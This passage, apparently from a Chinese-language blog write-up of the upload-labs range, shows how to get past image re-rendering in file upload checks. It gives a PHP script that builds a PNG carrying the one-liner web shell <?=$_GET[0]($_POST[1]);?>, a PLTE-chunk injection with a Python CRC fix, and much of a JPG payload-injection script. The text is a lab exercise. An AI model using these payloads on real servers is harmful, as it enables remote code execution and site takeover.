<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>
           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>
           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>
           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>但我TM竟然不知道<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>这个怎么利用？？？！！！</p>
<p>制作好png上传后下载下来成功镶入了那句话，但我还是不知道怎么用。。。算了先放这里</p>
<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>在PLTE数据块后加入一句话</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201526629.png" alt loading="lazy"></p>
<p>计算PLTE数据块的CRC<br>CRC脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii
<span class="token keyword">import</span> re

png <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'2.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> png<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
png<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
hexstr <span class="token operator">=</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>a<span class="token punctuation">)</span>

<span class="token triple-quoted-string string">''' PLTE crc '''</span>
data <span class="token operator">=</span>  <span class="token string">'504c5445'</span><span class="token operator">+</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'504c5445(.*?)49444154'</span><span class="token punctuation">,</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span></code></pre>

<p>运算结果：526579b0</p>
<p>修改CRC值</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209201005832.png" alt loading="lazy"></p>
<p>将这个图片上传就传上一句话了（反正我是没搞出来）。。。<a href="https://github.com/Yang1k/upload-labs-Pass16">原文中素材链接</a></p>
<h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>首先准备一张.jpg后缀的文件，上传上去然后将二次渲染后的图片下载下来命名为1.jpg</p>
<p>然后上国外大佬脚本，并且命名为<code>jpg_payload.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">/*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */</span>

    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=phpinfo();?>"</span><span class="token punctuation">;</span> <span class="token comment">/*这里插入想插入的一句话代码*/</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>
        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span> 
                    <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span> 
                    <span class="token variable">$miniPayload</span> <span class="token operator">.</span> 
                    <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span> 
                    <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">break</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>
                    <span class="token variable">$outStream</span> <span class="token operator">=</span> 
                        <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span> 
                        <span class="token variable">$miniPayload</span> <span class="token operator">.</span> 
                        <span class="token function">substr</span><span class="token punctuation">(</span>
                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>
                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token number">0</span><span class="token punctuation">,</span>
                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span> 
                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>
        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>
        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
